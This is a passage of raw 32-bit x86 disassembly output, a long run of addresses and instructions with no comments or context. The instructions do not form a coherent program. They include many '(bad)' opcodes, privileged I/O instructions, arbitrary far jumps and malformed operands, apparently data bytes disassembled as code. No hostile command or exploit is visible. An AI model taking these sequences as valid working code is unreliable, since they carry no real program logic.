  4040b5:	dec    ebp
  4040b6:	test   DWORD PTR [eax-0x46],ebx
  4040b9:	inc    esp
  4040ba:	mov    dl,0xa9
  4040bc:	(bad)  
  4040bd:	jmp    0xe732ceec
  4040c2:	inc    edi
  4040c3:	cmp    ebp,DWORD PTR [ecx]
  4040c5:	and    al,0x9a
  4040c8:	(bad)  
  4040c9:	call   0x5cce:0x88f6fe8
  4040d0:	sub    DWORD PTR [ebx],esi
  4040d2:	mov    al,BYTE PTR [edx+eiz*8]
  4040d5:	leave  
  4040d6:	pop    ebx
  4040d7:	xor    eax,0x34bdb197
  4040dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040dd:	js     0x404081
  4040df:	ss mov esp,0x8c55f25a
  4040e5:	pop    edi
  4040e6:	xchg   edx,eax
  4040e7:	dec    ebx
  4040e8:	adc    eax,0x5cf857f5
  4040ed:	push   0xfffffff0
  4040ef:	pop    ecx
  4040f0:	ins    BYTE PTR es:[edi],dx
  4040f1:	sub    edx,edx
  4040f3:	test   eax,0xa4f97070
  4040f8:	adc    eax,0xc1210022
  4040fd:	mov    bh,0xd5
  4040ff:	jns    0x404118
  404101:	cdq    
  404102:	test   al,0x72
  404104:	jge    0x40413e
  404106:	das    
  404107:	adc    al,0x6c
  404109:	dec    esp
  40410a:	add    BYTE PTR [eax-0x19],bl
  40410d:	sbb    bl,cl
  40410f:	ins    DWORD PTR es:[edi],dx
  404110:	fcmovnbe st,st(3)
  404112:	jmp    0x714a4ad8
  404117:	jb     0x4040a2
  404119:	ja     0x4040cc
  40411b:	dec    eax
  40411c:	lea    di,[eax+esi*1-0x7dd3ce5a]
  404124:	scas   eax,DWORD PTR es:[edi]
  404125:	jmp    0xeca7:0x5f8cd1ec
  40412c:	mov    ah,0x9c
  40412e:	jg     0x404143
  404130:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404132:	into   
  404133:	or     al,0xaf
  404135:	pop    edx
  404136:	cmp    ebx,DWORD PTR [esi]
  404138:	out    0x2f,al
  40413a:	aad    0x9
  40413c:	ins    BYTE PTR es:[edi],dx
  40413d:	jae    0x4041a3
  40413f:	repnz add ebx,ebx
  404142:	mov    ecx,0x15379ae3
  404147:	sbb    eax,0xc2d5d384
  40414c:	adc    edi,eax
  40414e:	dec    ecx
  40414f:	mov    bl,ch
  404151:	jo     0x40416b
  404153:	inc    esi
  404154:	dec    edi
  404155:	mov    BYTE PTR [eax+0x59481fa7],ch
  40415b:	jle    0x404199
  40415d:	and    edx,DWORD PTR [ebx]
  40415f:	mov    esp,0x5fa30167
  404164:	retf   0x1467
  404167:	xor    DWORD PTR [eax+eax*1],ecx
  40416a:	fwait
  40416b:	xchg   edx,eax
  40416c:	lds    esp,FWORD PTR [edi-0xb381595]
  404172:	ret    0x8e67
  404175:	retf   
  404176:	test   DWORD PTR [ecx],eax
  404178:	mov    bh,0xc8
  40417a:	mov    gs,WORD PTR [ebp+0x523873de]
  404180:	retf   
  404181:	mov    dl,0xd5
  404183:	ins    BYTE PTR es:[edi],dx
  404184:	scas   eax,DWORD PTR es:[edi]
  404185:	inc    eax
  404186:	inc    ecx
  404187:	xchg   ebx,eax
  404188:	les    esi,FWORD PTR [edi-0x4d]
  40418b:	jne    0x404182
  40418d:	and    eax,0x6724711d
  404192:	idiv   DWORD PTR [ecx+0x76435f96]
  404198:	jg     0x4041d8
  40419a:	icebp  
  40419b:	dec    ebp
  40419c:	ja     0x40413f
  40419e:	adc    DWORD PTR [edi+0x4f],edi
  4041a1:	ficomp DWORD PTR [esi-0x4a2e4000]
  4041a7:	hlt    
  4041a8:	jmp    0x7595d316
  4041ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ae:	aam    0x54
  4041b0:	fdivr  st,st(6)
  4041b2:	dec    edx
  4041b3:	sbb    al,dl
  4041b5:	rcl    DWORD PTR [eax+eax*8+0x7f48d806],cl
  4041bc:	xchg   ecx,eax
  4041bd:	mov    gs,WORD PTR [ebp+0x35]
  4041c0:	xchg   DWORD PTR [ecx-0x2],eax
  4041c3:	loop   0x4041f6
  4041c5:	imul   edx,DWORD PTR [ebp-0x60],0xffffffce
  4041c9:	add    cl,BYTE PTR [edi+eax*8]
  4041cc:	in     eax,0x21
  4041ce:	cli    
  4041cf:	gs cmp al,0x79
  4041d2:	ds dec esi
  4041d4:	pop    esi
  4041d5:	mov    ebx,DWORD PTR [esi+0x3c]
  4041d8:	add    edi,DWORD PTR [ebx]
  4041da:	(bad)  
  4041db:	fadd   DWORD PTR [ebx+0x6]
  4041de:	sti    
  4041df:	js     0x40417a
  4041e1:	out    dx,eax
  4041e2:	inc    esp
  4041e3:	es and esi,esp
  4041e6:	add    eax,0xd0ba9d4c
  4041eb:	mov    edx,0xc4b424fc
  4041f0:	icebp  
  4041f1:	aaa    
  4041f2:	mov    al,0x68
  4041f4:	in     eax,0x20
  4041f6:	push   ecx
  4041f7:	dec    esp
  4041f8:	in     eax,0x4d
  4041fa:	push   ecx
  4041fb:	test   al,0x0
  4041fd:	sbb    BYTE PTR [eax+0x77],ch
  404200:	adc    bl,BYTE PTR [edi+0x2583cd0b]
  404206:	sbb    BYTE PTR [ebx],bl
  404208:	bound  eax,QWORD PTR [ebx+0x6f]
  40420b:	sbb    eax,DWORD PTR [eax]
  40420d:	dec    BYTE PTR [ebx-0xd]
  404210:	xchg   edx,eax
  404211:	push   0xfffffff2
  404213:	inc    ebp
  404214:	dec    ebx
  404215:	out    0x9f,al
  404217:	out    dx,al
  404218:	call   0x36c0:0xb61f6bc2
  40421f:	lds    ecx,FWORD PTR [edi-0x28930c96]
  404225:	not    DWORD PTR [eax-0xd]
  404228:	cmp    eax,0xa85641a7
  40422d:	adc    dl,BYTE PTR [eax]
  40422f:	mov    ds:0x9f4c9dd0,al
  404234:	dec    ebx
  404235:	repz sub eax,DWORD PTR [edx]
  404238:	sar    DWORD PTR [esi],cl
  40423a:	add    eax,0x3794fca4
  40423f:	imul   esp,DWORD PTR [edi-0x3f30b59b],0xe2bbd173
  404249:	es inc ebx
  40424b:	test   al,0xc3
  40424d:	loop   0x4042b5
  40424f:	add    DWORD PTR [ebp+0xa],0x31
  404253:	cmp    esi,DWORD PTR [ebx]
  404255:	and    DWORD PTR [esi+0x4a08ca32],ebx
  40425b:	call   0xcad53319
  404260:	cmp    al,0xea
  404262:	(bad)  
  404263:	out    dx,al
  404264:	mov    al,0xcc
  404266:	frstor [eax]
  404268:	shr    BYTE PTR [edx],0x17
  40426b:	jmp    0x404242
  40426d:	mov    ch,0xef
  40426f:	mov    dl,0xd4
  404271:	jmp    0x552a9a57
  404276:	aaa    
  404277:	aas    
  404278:	jbe    0x40421c
  40427a:	je     0x40421c
  40427c:	in     eax,dx
  40427d:	sbb    eax,0x4780b2f3
  404282:	pop    eax
  404283:	pop    es
  404284:	in     eax,dx
  404285:	cmp    eax,DWORD PTR [edx+0x21689c56]
  40428b:	pop    ebp
  40428c:	xor    al,al
  40428e:	pushf  
  40428f:	(bad)  
  404290:	push   ebx
  404291:	not    BYTE PTR [edx+0x5a8e9fdf]
  404297:	in     al,0xff
  404299:	ror    DWORD PTR [ebx+0x71],0x62
  40429d:	int3   
  40429e:	stos   BYTE PTR es:[edi],al
  40429f:	call   0x7be2c249
  4042a4:	clc    
  4042a5:	jp     0x404260
  4042a7:	jle    0x4042f4
  4042a9:	add    dl,BYTE PTR [esi+0xdf51c4b]
  4042af:	mov    dh,0xe4
  4042b1:	jns    0x4042af
  4042b3:	pop    edx
  4042b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042b5:	pop    ds
  4042b6:	adc    BYTE PTR [edx+0xf1d5d34],dl
  4042bc:	xchg   esi,eax
  4042bd:	pushf  
  4042be:	les    edi,FWORD PTR [ebx]
  4042c0:	int    0x84
  4042c2:	pusha  
  4042c3:	cmp    BYTE PTR [eax-0x3a6fe53b],cl
  4042c9:	in     al,dx
  4042ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042cb:	xlat   BYTE PTR ds:[ebx]
  4042cc:	mov    DWORD PTR [esi+0x71a8be2a],edx
  4042d2:	xchg   ebp,eax
  4042d3:	cs fwait
  4042d5:	ss add eax,0xc404e2f0
  4042db:	add    DWORD PTR [ebx+ebx*1],esi
  4042de:	push   esp
  4042df:	pusha  
  4042e0:	jb     0x4042e2
  4042e2:	xor    ebp,DWORD PTR [edi]
  4042e4:	pop    edi
  4042e5:	cmp    bh,0xff
  4042e8:	jne    0x404363
  4042ea:	ja     0x40436b
  4042ec:	inc    edx
  4042ed:	js     0x4042e7
  4042ef:	cld    
  4042f0:	(bad)  
  4042f1:	xor    ebp,DWORD PTR [edi+ebp*8]
  4042f4:	jl     0x404357
  4042f6:	xchg   esp,eax
  4042f7:	dec    edx
  4042f8:	(bad)  
  4042f9:	into   
  4042fa:	jo     0x40435d
  4042fc:	aam    0x93
  4042fe:	scas   eax,DWORD PTR es:[edi]
  4042ff:	adc    eax,0xf5628e28
  404304:	inc    esp
  404305:	in     al,0x5c
  404307:	cmp    DWORD PTR [ebx+0xaac43d5],esi
  40430d:	dec    ebx
  40430e:	sbb    al,0xcd
  404310:	lock xchg esp,eax
  404312:	test   eax,0x429e06e5
  404317:	and    edx,esi
  404319:	out    dx,al
  40431a:	jl     0x4042a9
  40431c:	push   edx
  40431d:	mov    DWORD PTR [edx-0x1077a4af],esi
  404323:	out    0x1,al
  404325:	mov    ah,0x55
  404327:	mov    ecx,0x32cae89b
  40432c:	sub    eax,0xe8ceee4c
  404331:	xor    dh,BYTE PTR [ecx+0x2aed3aa2]
  404337:	stos   DWORD PTR es:[edi],eax
  404338:	aaa    
  404339:	cmovno ebx,DWORD PTR [ebp-0x76]
  40433d:	jb     0x40435e
  40433f:	cmp    BYTE PTR [ecx],bl
  404341:	outs   dx,BYTE PTR ds:[esi]
  404342:	lods   al,BYTE PTR ds:[esi]
  404343:	sub    bh,al
  404345:	les    esp,FWORD PTR [edi]
  404347:	jne    0x404364
  404349:	dec    ebp
  40434a:	sub    eax,0xb9593523
  40434f:	pop    eax
  404350:	pop    ebp
  404351:	test   BYTE PTR [edx-0x3a],ch
  404354:	ds xchg edi,eax
  404356:	neg    DWORD PTR [eax]
  404358:	mov    ch,0xe8
  40435a:	xor    al,0x8c
  40435c:	jno    0x404304
  40435e:	fild   WORD PTR [esi+0x1710b49f]
  404364:	jp     0x404389
  404366:	or     eax,0xb8f249cc
  40436b:	(bad)  [edx]
  40436d:	push   ds
  40436e:	pusha  
  40436f:	mov    ch,0x2f
  404371:	pop    edi
  404372:	mov    dh,dh
  404374:	inc    edi
  404375:	push   ds
  404376:	or     edi,DWORD PTR [edx+0x73]
  404379:	or     BYTE PTR [ebx-0x6db083ea],dl
  40437f:	fistp  QWORD PTR [ebp-0x35]
  404382:	pop    es
  404383:	dec    ecx
  404384:	mov    ds:0xf8493061,al
  404389:	push   ss
  40438a:	rcr    DWORD PTR [ecx+0x5d],1
  40438d:	fdiv   QWORD PTR [eax+edi*1]
  404390:	jne    0x4043e5
  404392:	retf   0x37fe
  404395:	fcom   DWORD PTR [ebp+ebx*1+0x48d479b8]
  40439c:	test   al,0x82
  40439e:	shr    ebp,0x74
  4043a1:	test   eax,0x2f6dbcc3
  4043a6:	and    edx,DWORD PTR [edx+0x4d]
  4043a9:	push   0xffffffd0
  4043ab:	jne    0x4043f2
  4043ad:	xchg   DWORD PTR [ecx+0x4bf77258],esi
  4043b3:	mov    DWORD PTR [ecx-0x29153712],ebp
  4043b9:	les    ebp,FWORD PTR [edx]
  4043bb:	sub    al,0x61
  4043bd:	push   ebx
  4043be:	fld    st(6)
  4043c0:	clc    
  4043c1:	xchg   esi,eax
  4043c2:	daa    
  4043c3:	xor    cl,BYTE PTR [esi]
  4043c5:	call   0xdf2a:0xff82e09
  4043cc:	leave  
  4043cd:	scas   eax,DWORD PTR es:[edi]
  4043ce:	fisttp DWORD PTR [ecx+0x7f9c5d74]
  4043d4:	test   DWORD PTR [edx+0x4bd6c81a],edi
  4043da:	mov    ds:0x3f2b0578,eax
  4043df:	fcomip st,st(4)
  4043e1:	push   eax
  4043e2:	pushf  
  4043e3:	aaa    
  4043e4:	mov    esi,0xbb631872
  4043e9:	and    DWORD PTR [esi+0x6e74774d],esi
  4043ef:	or     eax,0xce997f13
  4043f4:	mov    eax,0x52b595cc
  4043f9:	and    eax,ebx
  4043fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043fc:	xor    esp,esi
  4043fe:	mov    ah,0xb0
  404400:	jmp    0x2db4:0xe05cba5e
  404407:	mov    ds:0x3e66b13a,eax
  40440c:	pop    ebp
  40440d:	retf   
  40440e:	push   ss
  40440f:	cwde   
  404410:	inc    edx
  404411:	in     al,0x9b
  404413:	push   edi
  404414:	inc    eax
  404415:	shr    DWORD PTR [esi],1
  404417:	mov    edx,0x3b6952d0
  40441c:	lea    edx,[ebp+0x1b]
  40441f:	pop    eax
  404420:	pushf  
  404421:	in     eax,dx
  404422:	jae    0x40440c
  404424:	push   ecx
  404425:	sub    BYTE PTR [eax],dh
  404427:	xchg   ecx,eax
  404428:	(bad)  [eax+0xb]
  40442b:	in     al,0xe3
  40442d:	push   es
  40442e:	cmp    ebp,DWORD PTR [ebp+0x1a]
  404431:	dec    edi
  404432:	pop    edi
  404433:	dec    ebx
  404434:	dec    esi
  404435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404436:	cmp    DWORD PTR [ebx+edi*1-0x3af84ef7],0xffffffb8
  40443e:	dec    ebx
  40443f:	repz xlat BYTE PTR ds:[ebx]
  404441:	sub    bl,BYTE PTR [ebp-0x36]
  404444:	and    esp,esi
  404446:	pop    edx
  404447:	inc    BYTE PTR ds:0xff490c16
  40444d:	out    0x15,eax
  40444f:	cmp    bh,BYTE PTR [edx+0x4d]
  404452:	and    eax,0xfe36519f
  404457:	mov    bl,0x3c
  404459:	jg     0x40446c
  40445b:	fisubr DWORD PTR [ebx-0xa3bbfda]
  404461:	fsubr  QWORD PTR [esp+edx*8-0x54d6b6f6]
  404468:	adc    DWORD PTR [edx+0x21c41ac7],edx
  40446e:	test   eax,0xe9b6d0ec
  404473:	jl     0x404487
  404475:	mov    ebp,0xed5e5203
  40447a:	pop    edi
  40447b:	jmp    0x1b91dfa0
  404480:	adc    eax,0x56303d42
  404485:	imul   edi,DWORD PTR [esi+0x22],0x67
  404489:	loopne 0x4044b0
  40448b:	and    DWORD PTR [eax+0x44],eax
  40448e:	xchg   DWORD PTR [ecx+0x70],esp
  404491:	(bad)  
  404492:	push   ds
  404493:	jnp    0x404441
  404495:	xlat   BYTE PTR ds:[ebx]
  404496:	aaa    
  404497:	daa    
  404498:	pop    es
  404499:	es mov al,0xf1
  40449c:	jo     0x4044b9
  40449e:	sub    bh,BYTE PTR [edx+edx*1-0x286b100b]
  4044a5:	or     bl,ah
  4044a7:	fsubr  DWORD PTR [edi+ebp*1+0x74]
  4044ab:	inc    edi
  4044ac:	mov    ch,0x2c
  4044ae:	jne    0x404451
  4044b0:	or     ch,cl
  4044b2:	push   cs
  4044b3:	out    0xe4,al
  4044b5:	sti    
  4044b6:	mov    ah,0x70
  4044b8:	pop    es
  4044b9:	fs mov ecx,0x79221399
  4044bf:	push   edx
  4044c0:	xchg   edi,eax
  4044c1:	mov    eax,ds:0x3410468c
  4044c6:	cli    
  4044c7:	xchg   dh,al
  4044c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ca:	mul    BYTE PTR [esi]
  4044cc:	shl    DWORD PTR [eax+ebx*4-0x6c034acb],cl
  4044d3:	sub    BYTE PTR [eax],bh
  4044d5:	xlat   BYTE PTR ds:[ebx]
  4044d6:	idiv   al
  4044d8:	mov    edx,tr5
  4044db:	add    edx,esp
  4044dd:	add    bl,ch
  4044df:	ins    BYTE PTR es:[edi],dx
  4044e0:	imul   edi,DWORD PTR [ecx+0x1e686f7b],0x1c
  4044e7:	xchg   ecx,eax
  4044e8:	retf   0x5b53
  4044eb:	and    bh,0x30
  4044ee:	gs mov esi,0x1834abf3
  4044f4:	and    dh,BYTE PTR [ebp+0x42120dc]
  4044fa:	clc    
  4044fb:	pop    eax
  4044fc:	jge    0x404480
  4044fe:	out    dx,al
  4044ff:	js     0x404561
  404501:	in     eax,dx
  404502:	inc    edi
  404503:	or     BYTE PTR [bx+si],0xd0
  404507:	sbb    eax,0x2fb6a2d1
  40450c:	(bad)  
  40450d:	stc    
  40450e:	inc    ebp
  40450f:	xor    DWORD PTR [esi+0xf5b9fbc],eax
  404515:	repnz ror DWORD PTR [ecx+0x17],cl
  404519:	int    0xf8
  40451b:	push   ebp
  40451c:	aam    0x7d
  40451e:	mov    ecx,0x9894b69
  404523:	pop    edx
  404524:	not    BYTE PTR [edi+0x7d4df9de]
  40452a:	retf   
  40452b:	(bad)  
  40452d:	test   eax,0x2c8ed129
  404532:	xchg   BYTE PTR [edx+0x32],ah
  404535:	rcr    BYTE PTR ds:0x12d6a13a,cl
  40453b:	sahf   
  40453c:	outs   dx,DWORD PTR ds:[esi]
  40453d:	call   0x15a77fc
  404542:	shr    DWORD PTR [eax+0x44],0xac
  404546:	jge    0x40453b
  404548:	jo     0x404530
  40454a:	push   ecx
  40454b:	test   DWORD PTR [eax-0x514e0e33],0xae0a724a
  404555:	jecxz  0x404565
  404557:	call   0x214b2633
  40455c:	js     0x40452e
  40455e:	mov    ebp,ebx
  404560:	sub    eax,0x24d21bfb
  404565:	mov    WORD PTR [ebx],?
  404567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404568:	or     BYTE PTR [ecx+edx*1],bh
  40456b:	cmp    ebp,DWORD PTR [eax-0x5e917348]
  404571:	and    esp,DWORD PTR [ecx+0x4e]
  404574:	add    edx,DWORD PTR [edx-0x552e36bc]
  40457a:	lea    eax,[ebx]
  40457c:	mov    ebp,0x8cd5e89b
  404581:	enter  0x6ffe,0xe6
  404585:	mov    fs,ecx
  404587:	mov    ch,BYTE PTR [ebx-0x31f50045]
  40458d:	push   es
  40458e:	dec    eax
  40458f:	pop    ebp
  404590:	push   ecx
  404591:	stos   BYTE PTR es:[edi],al
  404592:	(bad)  
  404593:	jno    0x404590
  404595:	repz fist WORD PTR [edx+0x617f3896]
  40459c:	jne    0x404526
  40459e:	fwait
  40459f:	mov    cl,0x8
  4045a1:	test   eax,0x520ca236
  4045a6:	leave  
  4045a7:	sub    BYTE PTR [edi-0x53],cl
  4045aa:	js     0x404618
  4045ac:	in     al,dx
  4045ad:	push   ecx
  4045ae:	ret    0x147
  4045b1:	cmp    al,BYTE PTR [esi]
  4045b3:	push   ebx
  4045b4:	fidiv  DWORD PTR [ecx]
  4045b6:	xchg   edx,eax
  4045b7:	mov    dl,0xaa
  4045b9:	adc    al,0x10
  4045bb:	mov    al,0x1f
  4045bd:	xor    ah,ah
  4045bf:	shl    DWORD PTR [eax-0x17],0x96
  4045c3:	test   DWORD PTR [edi],ebx
  4045c5:	rol    DWORD PTR [ecx-0x6224b05e],1
  4045cb:	mov    al,0x10
  4045cd:	push   0xd425b9bd
  4045d2:	cld    
  4045d3:	push   edx
  4045d4:	pop    esi
  4045d5:	enter  0xe379,0xf9
  4045d9:	sub    bh,BYTE PTR [ecx+0x59]
  4045dc:	ins    BYTE PTR es:[edi],dx
  4045dd:	xor    BYTE PTR [edx-0x652f1385],dh
  4045e3:	cwde   
  4045e4:	push   ebp
  4045e5:	pop    esp
  4045e6:	nop
  4045e7:	cmp    ah,0x85
  4045ea:	arpl   WORD PTR [esi+0xa8f41cf],si
  4045f0:	push   cs
  4045f1:	inc    ecx
  4045f2:	sub    eax,0x320c922e
  4045f7:	mov    ah,0x76
  4045f9:	xchg   edi,eax
  4045fa:	fucomi st,st(6)
  4045fc:	sub    ah,BYTE PTR [ecx-0x34ac2a36]
  404602:	dec    ebx
  404603:	mov    ah,0x51
  404605:	imul   eax,DWORD PTR [eax-0x4c4e5788],0x24
  40460c:	or     al,0x9d
  40460e:	ins    DWORD PTR es:[edi],dx
  40460f:	jo     0x4045e0
  404611:	xchg   ebx,eax
  404612:	pop    ds
  404613:	in     al,0xfb
  404615:	fistp  DWORD PTR [ebp-0x48a86f27]
  40461b:	jne    0x4045de
  40461d:	or     eax,0x59f42bcf
  404622:	jno    0x404674
  404624:	scas   eax,DWORD PTR es:[edi]
  404625:	pop    edi
  404626:	mov    eax,ds:0x8011422
  40462b:	xchg   edx,eax
  40462c:	cld    
  40462d:	or     BYTE PTR [edi+0x35],0x37
  404631:	jmp    0x265fb444
  404636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404637:	mov    DWORD PTR [esi-0x755b808e],eax
  40463d:	dec    esp
  40463e:	push   ds
  40463f:	in     al,dx
  404640:	xor    al,0xb
  404642:	add    DWORD PTR [eax-0x36],0xffffffdd
  404646:	mov    esp,0xbf16a5be
  40464b:	mov    eax,ds:0xd30e8fe4
  404650:	push   ebp
  404651:	out    0x39,eax
  404653:	push   esp
  404654:	out    dx,al
  404655:	or     esi,esi
  404657:	aaa    
  404658:	cwde   
  404659:	loop   0x40466a
  40465b:	xchg   edx,eax
  40465c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40465d:	bound  edi,QWORD PTR [ebp+0x34]
  404660:	sbb    eax,esi
  404662:	dec    ebp
  404663:	push   eax
  404664:	inc    edx
  404665:	xchg   ebx,eax
  404666:	sub    esi,DWORD PTR [ecx]
  404668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404669:	imul   esp,DWORD PTR [ecx],0x6a
  40466c:	xchg   eax,esp
  40466e:	jecxz  0x40463e
  404670:	push   edi
  404671:	or     esi,DWORD PTR [esi-0x3ba82a07]
  404677:	lock xchg edi,eax
  404679:	scas   al,BYTE PTR es:[edi]
  40467a:	aas    
  40467b:	fistp  DWORD PTR [ecx-0x1454eace]
  404681:	fiadd  WORD PTR [ebp+ecx*1-0x373e15]
  404688:	add    ebp,DWORD PTR [ebx+0x1c8d4438]
  40468e:	fstp   TBYTE PTR [ecx-0x4e8c32e3]
  404694:	stc    
  404695:	mov    al,ds:0x921c93f7
  40469a:	sub    esi,DWORD PTR fs:[esi]
  40469d:	adc    esi,DWORD PTR [ebx-0x61]
  4046a0:	mov    bl,0xb9
  4046a2:	jo     0x404702
  4046a4:	out    dx,eax
  4046a5:	push   esi
  4046a6:	ss ret 
  4046a8:	sbb    BYTE PTR [edx-0x38],bl
  4046ab:	adc    BYTE PTR [ebp-0x11cd2063],al
  4046b1:	cmp    BYTE PTR [edx-0xb],bh
  4046b4:	push   ebp
  4046b5:	test   al,0xcf
  4046b7:	adc    DWORD PTR [edi+eiz*2+0x4a4f7773],esp
  4046be:	mov    cl,0xe5
  4046c0:	jns    0x40467f
  4046c2:	pop    esp
  4046c3:	add    BYTE PTR [ebp+0x7b],dh
  4046c6:	xor    bl,BYTE PTR ds:0x58c56181
  4046cc:	adc    al,0xa9
  4046ce:	into   
  4046cf:	fsub   QWORD PTR [esi+0x4ea2cb84]
  4046d5:	push   eax
  4046d6:	fidiv  DWORD PTR [edx+ebx*4+0x1b]
  4046da:	dec    edi
  4046db:	inc    ecx
  4046dc:	arpl   WORD PTR [ebp+edx*8-0x52e5d9eb],sp
  4046e3:	outs   dx,DWORD PTR ds:[esi]
  4046e4:	mov    al,ds:0xbf76015d
  4046e9:	and    eax,0x59e1d40a
  4046ee:	adc    eax,0x7570ff64
  4046f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046f4:	mov    ah,0x29
  4046f6:	push   cs
  4046f7:	xor    ah,BYTE PTR [ecx]
  4046f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046fa:	or     al,0xfd
  4046fc:	call   0x622b:0xf1f3f7fd
  404703:	push   0x6d
  404705:	push   es
  404706:	cmp    al,0x28
  404708:	push   ds
  404709:	(bad)  
  40470a:	mov    eax,0x63056d00
  40470f:	sub    DWORD PTR [ebp+ecx*2-0x18],eax
  404713:	cmp    BYTE PTR [edx-0x11908615],ch
  404719:	fild   QWORD PTR [edx+0xe]
  40471c:	mov    ch,0x93
  40471e:	jecxz  0x404783
  404720:	jmp    0x404792
  404722:	ins    BYTE PTR es:[edi],dx
  404723:	retf   
  404724:	jecxz  0x404765
  404726:	sar    ecx,0x4
  404729:	push   ecx
  40472a:	es loop 0x4046ba
  40472d:	call   0x51d2897b
  404732:	loopne 0x40473f
  404734:	or     eax,DWORD PTR [ebp-0x63937e0d]
  40473a:	cli    
  40473b:	or     edx,ebp
  40473d:	sub    eax,0xe3ad63c7
  404742:	daa    
  404743:	int3   
  404744:	adc    eax,0x3db1a263
  404749:	xor    ecx,DWORD PTR [ecx]
  40474b:	xor    ebp,DWORD PTR ds:0x430a72e1
  404751:	mov    edx,0xf2c8f388
  404756:	or     dl,BYTE PTR [ebx-0x645526ce]
  40475c:	xchg   edx,eax
  40475d:	sahf   
  40475e:	lock mov ds:0x7b245e00,eax
  404764:	sub    esi,eax
  404766:	pop    es
  404767:	push   edi
  404768:	mov    al,0x1d
  40476a:	jns    0x40471f
  40476c:	mov    bh,0x78
  40476e:	enter  0xdeb2,0x4a
  404772:	and    BYTE PTR [edi],cl
  404774:	push   0x46f1d4ec
  404779:	mov    bh,0xe7
  40477b:	mov    dh,0x81
  40477d:	jecxz  0x404710
  40477f:	xchg   esp,eax
  404780:	je     0x404796
  404782:	add    eax,DWORD PTR [esi]
  404784:	cli    
  404785:	lods   al,BYTE PTR fs:[esi]
  404787:	enter  0x376d,0xa4
  40478b:	xor    eax,0x842eb059
  404790:	push   ecx
  404791:	outs   dx,DWORD PTR ds:[esi]
  404792:	test   ebx,ecx
  404794:	push   0x1d
  404796:	retf   0x252d
  404799:	mov    ah,0xb
  40479b:	je     0x4047d6
  40479d:	call   0x881b1573
  4047a2:	scas   eax,DWORD PTR es:[edi]
  4047a3:	xchg   esi,eax
  4047a4:	mov    cl,BYTE PTR [edi+eiz*2+0x41]
  4047a8:	and    DWORD PTR [edi-0x2dde6fb1],ebp
  4047ae:	push   esi
  4047af:	lea    ecx,[esi+eax*8+0x10]
  4047b3:	jmp    0xc8a4:0xf8649a5f
  4047ba:	cli    
  4047bb:	inc    esp
  4047bc:	sti    
  4047bd:	loope  0x404797
  4047bf:	pop    edx
  4047c0:	pop    eax
  4047c1:	scas   eax,DWORD PTR es:[edi]
  4047c2:	out    dx,al
  4047c3:	mov    eax,0xc73c6589
  4047c8:	or     al,0xd0
  4047ca:	jo     0x404753
  4047cc:	frstor [edi+0x63315b18]
  4047d2:	sbb    cl,BYTE PTR ds:0x433e67b5
  4047d8:	adc    bh,BYTE PTR [eax+0x59e881fc]
  4047de:	nop
  4047df:	cmp    eax,edx
  4047e1:	sub    eax,0x9e2935ca
  4047e6:	sub    al,0x58
  4047e8:	mov    ?,WORD PTR [eax+0x62]
  4047eb:	or     bh,BYTE PTR [edi+0x77]
  4047ee:	adc    DWORD PTR [edi+0x56],esi
  4047f1:	adc    al,0xb6
  4047f3:	or     eax,0x207bb8d6
  4047f8:	scas   al,BYTE PTR es:[edi]
  4047f9:	cmp    ch,ch
  4047fb:	gs cmp esp,ebp
  4047fe:	sub    bh,BYTE PTR [ebx-0x2a5b2afd]
  404804:	je     0x4047f5
  404806:	or     DWORD PTR [ebx+esi*8+0x7c],esi
  40480a:	arpl   WORD PTR ds:0x1e73c485,di
  404810:	imul   esp,DWORD PTR [esi-0x53],0x9bee891
  404817:	in     al,0x38
  404819:	fild   DWORD PTR [ebx+0x79543c26]
  40481f:	(bad)  
  404820:	adc    edi,edi
  404822:	lods   eax,DWORD PTR ds:[esi]
  404823:	scas   eax,DWORD PTR es:[edi]
  404824:	or     BYTE PTR ds:0xb059ed63,bh
  40482a:	push   ss
  40482b:	rcr    DWORD PTR [esi+eax*8-0x75],cl
  40482f:	lods   eax,DWORD PTR ds:[esi]
  404830:	pusha  
  404831:	int    0x22
  404833:	test   eax,0xbaf81a37
  404838:	mov    al,0xb8
  40483a:	pop    ebp
  40483b:	push   es
  40483c:	pushf  
  40483d:	fwait
  40483e:	sti    
  40483f:	cli    
  404840:	push   ss
  404841:	pop    es
  404842:	xchg   ebp,eax
  404843:	jae    0x404871
  404845:	sbb    DWORD PTR [esi+0x6],0xffffff83
  404849:	xchg   edi,eax
  40484a:	and    eax,0x450b5809
  40484f:	jle    0x4048a2
  404851:	ret    0x9cea
  404854:	pop    es
  404855:	es xchg edi,eax
  404857:	xlat   BYTE PTR ds:[ebx]
  404858:	mov    ah,0x64
  40485a:	pop    ebp
  40485b:	xchg   ecx,eax
  40485c:	inc    ebx
  40485d:	jb     0x40483d
  40485f:	push   eax
  404860:	dec    eax
  404861:	or     eax,0x2dc52578
  404866:	inc    ebp
  404867:	jmp    0x1d16:0xc3bd72e7
  40486e:	cdq    
  40486f:	add    eax,ebx
  404871:	(bad)  
  404872:	mov    esp,0xaeab8b5
  404877:	in     al,0x9
  404879:	enter  0x9840,0xf7
  40487d:	dec    ebp
  40487e:	xchg   ebx,eax
  40487f:	stos   BYTE PTR es:[edi],al
  404880:	adc    DWORD PTR [ecx],0xce3d24a0
  404886:	sti    
  404887:	xor    eax,edi
  404889:	test   BYTE PTR [edx+0x2a5b29f8],bh
  40488f:	fcom   QWORD PTR [ebp+0x52]
  404892:	adc    DWORD PTR [eax-0x1d6a23d7],edx
  404898:	loop   0x404846
  40489a:	fmul   QWORD PTR [esi+0x64070e1b]
  4048a0:	xchg   esi,eax
  4048a1:	mov    ebx,0xee8b52f9
  4048a6:	or     eax,0x633350f0
  4048ab:	sbb    eax,0x933172f5
